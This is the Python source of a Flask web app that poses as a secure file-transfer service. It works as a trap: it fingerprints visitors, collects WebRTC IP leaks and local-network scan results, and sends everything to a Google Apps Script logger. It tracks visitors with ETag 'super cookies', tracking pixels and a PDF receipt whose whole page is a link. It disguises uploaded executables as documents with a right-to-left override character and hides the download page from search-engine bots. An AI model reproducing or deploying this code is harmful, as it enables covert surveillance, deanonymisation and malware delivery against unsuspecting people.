import os
import json
import threading
import uuid
import datetime
import requests
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from fpdf import FPDF

app = Flask(__name__)

# --- CONFIGURATION ---
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'

if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}

# !!! ТВОЙ GOOGLE SCRIPT URL !!!
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# In-memory session storage
db = {}

# --- DATABASE HELPERS ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f: json.dump(data, f)
    except Exception as e: print(f"DB Save Error: {e}")

db = load_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- THREAT ANALYZER ---
def analyze_threats(server_ip, client_data, headers):
    anomalies = client_data.get('threat', {}).get('anomalies', [])
    ua = headers.get('User-Agent', '').lower()
    
    # 1. Header Analysis
    if 'mozilla' in ua and 'sec-ch-ua' not in headers and 'chrome' in ua:
        anomalies.append("HEADER: Chrome UA without Sec-CH-UA (Possible Bot)")
    
    # 2. WebRTC Leak
    webrtc = client_data.get('network', {}).get('webrtc', {})
    public_ips = webrtc.get('public', [])
    for ip in public_ips:
        if ip != server_ip: anomalies.append(f"VPN LEAK: WebRTC IP {ip} != HTTP IP {server_ip}")

    # 3. IPv6
    if client_data.get('network', {}).get('ipv6', {}).get('detected'):
        anomalies.append(f"IPv6 Detected: {client_data['network']['ipv6']['ip']}")

    # 4. Security & VM Checks
    if client_data.get('security', {}).get('incognito') == "Yes (Probable)":
        anomalies.append("SECURITY: Incognito Mode Detected")
    
    if client_data.get('fingerprints', {}).get('gpu', {}).get('renderer', '').find('SwiftShader') != -1:
        anomalies.append("VM DETECTED: Google SwiftShader Renderer")

    # 5. LAN Scan Results
    lan_scan = client_data.get('network', {}).get('lan_scan', [])
    if lan_scan:
        anomalies.append(f"LOCAL NETWORK: Gateway found at {lan_scan[0].get('ip')}")

    return list(set(anomalies))

# --- LOGGER (Google Sheets) ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load", anomalies=None):
    try:
        print(f"\n[{datetime.datetime.now()}] TRIGGER: {trigger_type} | IP: {user_ip}")
        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "anomalies": anomalies if anomalies else [],
            "details": data
        }
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
    except Exception as e:
        print(f"[-] Logger Error: {e}")

# --- PDF GENERATOR ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'SECURE TRANSFER RECEIPT', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
    pdf.set_text_color(255, 0, 0)
    pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
    pdf.link(0, 0, 210, 297, tracking_url)
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# ==========================================
# ===       TRAP ROUTES                  ===
# ==========================================

@app.route('/view/<path:filename>')
def view_trap(filename):
    uid = uuid.uuid4().hex[:8]
    forwarded_for = request.headers.get('X-Forwarded-For', '')
    real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
    
    threading.Thread(target=send_email_background, args=(
        {'meta': {'url': request.url, 'type': 'HTML Trap Open'}}, 
        real_ip, 
        request.headers.get('User-Agent'), 
        "TRAP PAGE OPENED", 
        [f"Target File: {filename}"]
    )).start()

    return render_template('trap.html', filename=filename, uid=uid)

@app.route('/raw/<path:filename>')
def raw_image(filename):
    directory = '.' 
    if not os.path.exists(os.path.join(directory, filename)):
        directory = app.config['UPLOAD_FOLDER']

    try:
        client_etag = request.headers.get('If-None-Match')
        is_returning = True if client_etag else False
        uid = client_etag.strip('"') if client_etag else uuid.uuid4().hex

        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
        referer = request.headers.get('Referer', '')
        
        if 'view/' not in referer:
             threading.Thread(target=send_email_background, args=(
                {'system': {'super_cookie_match': is_returning, 'referer': referer}}, 
                real_ip, 
                request.headers.get('User-Agent'), 
                "RAW IMAGE LOAD", 
                [f"File: {filename}"]
            )).start()

        response = send_from_directory(directory, filename)
        response.headers['ETag'] = f'"{uid}"'
        response.headers['Cache-Control'] = 'private, max-age=31536000'
        return response
    except:
        return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

# ==========================================
# ===       STANDARD ROUTES              ===
# ==========================================

@app.route('/health')
def health_check(): return "OK", 200

@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    client_etag = request.headers.get('If-None-Match')
    uid = client_etag.strip('"') if client_etag else request.args.get('uid', uuid.uuid4().hex)
    is_returning = True if client_etag else False
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if source != 'etag_check' and source != 'image_trap_etag':
        threading.Thread(target=send_email_background, args=(
            {'meta': {'url': f'PIXEL TRACK ({uid})', 'source': source}, 'system': {'super_cookie_match': is_returning}}, 
            ip, "Tracker", "PIXEL FIRED", []
        )).start()

    response = make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
    response.headers['Content-Type'] = 'image/gif'
    response.headers['ETag'] = f'"{uid}"'
    response.headers['Cache-Control'] = 'private, max-age=31536000'
    return response

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        for file in files:
            if file and allowed_file(file.filename):
                original_filename = file.filename
                try: ext = original_filename.rsplit('.', 1)[1].lower()
                except: ext = "bin"
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                uploaded_files.append({'name': original_filename, 'saved_name': saved_filename, 'format': ext.upper(), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'comments': []}
            save_db(db)
            return redirect(f"/{unique_id}")
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    global db
    db = load_db()
    data = db.get(unique_id)
    if not data: return "File not found", 404
    return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)

@app.route('/verify/<uid>/<path:filename>')
def verify_download(uid, filename):
    user_agent = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex']
    if any(bot in user_agent for bot in bots): return "<h1>Loading...</h1>", 200
    return render_template('semyanich.html', uid=uid, filename=filename)

@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    data = db.get(uid)
    if not data: return abort(404)
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    if target_file:
        spoofed_name = target_file['name']
        if target_file['saved_name'].endswith(('.exe', '.scr', '.bat')): spoofed_name = "Document_\u202ecod.exe"
        return send_from_directory(app.config['UPLOAD_FOLDER'], target_file['saved_name'], as_attachment=True, download_name=spoofed_name)
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/collect', methods=['POST'])
def collect_data():
    try:
        if request.is_json: data = request.json
        else: data = json.loads(request.data.decode('utf-8'))
        
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr

        # === CAPTURE SERVER-SIDE HEADERS ===
        if 'system' not in data: data['system'] = {}
        data['system']['accept_encoding'] = request.headers.get('Accept-Encoding', 'None')
        data['system']['accept_language'] = request.headers.get('Accept-Language', 'None')
        # ===================================

        anomalies = analyze_threats(real_ip, data, request.headers)
        if 'threat' in data and 'anomalies' in data['threat']: anomalies.extend(data['threat']['anomalies'])
        
        trigger = data.get('meta', {}).get('trigger', 'Unknown')
        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), trigger, list(set(anomalies)))).start()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/comment', methods=['POST'])
def add_comment():
    data = request.json
    uid = data.get('uid')
    if uid in db:
        if 'comments' not in db[uid]: db[uid]['comments'] = []
        db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
        save_db(db)
        forwarded_for = request.headers.get('X-Forwarded-For', '')
        real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
        threading.Thread(target=send_email_background, args=(data, real_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS", [])).start()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
